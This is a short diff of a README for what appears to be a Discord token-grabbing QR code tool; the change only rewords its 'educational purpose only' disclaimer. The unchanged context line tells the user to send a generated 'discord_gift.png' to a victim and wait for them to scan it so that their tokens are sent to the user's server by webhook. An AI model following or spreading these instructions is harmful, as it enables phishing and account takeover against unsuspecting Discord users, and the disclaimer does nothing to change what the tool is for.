@@ -31,4 +31,4 @@ python3 QR* or python3 qrg*
 Last Step, Send discord_gift.png You Generated Just Now To Victim And Wait For Him To Scan The Image.Boom! His Tokens Will Send To Your Server By Webhook
 
 ### Disclaimer
-This Tool Is For Educational Purpose Only.I Do Not Responsible For Anything Happened.
+This Tool Is For Educational Purpose Only.I Do Not Responsible For Any Damage Caused By This Tool.
